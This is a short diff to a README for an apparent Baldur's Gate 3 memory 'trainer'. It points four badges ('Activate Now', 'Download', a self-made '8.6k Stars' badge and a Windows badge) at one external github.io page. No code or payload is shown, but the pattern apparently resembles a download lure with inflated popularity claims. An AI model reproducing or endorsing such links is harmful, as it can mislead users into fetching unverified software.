@@ -11,10 +11,10 @@ Baldur’s Gate 3 is rich with tactical choices, but sometimes you want to test 
 \[!IMPORTANT]
 The trainer modifies gameplay in memory only. Your original save files remain safe.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 8.6k Stars](https://img.shields.io/badge/⭐️%208.6k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://baldurs-gate-3-trainer-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://baldurs-gate-3-trainer-tool.github.io/.github/)
+[![⭐️ 8.6k Stars](https://img.shields.io/badge/⭐️%208.6k-Stars-yellow?style=for-the-badge\&logo=github)](https://baldurs-gate-3-trainer-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://baldurs-gate-3-trainer-tool.github.io/.github/)
 
 ---
 
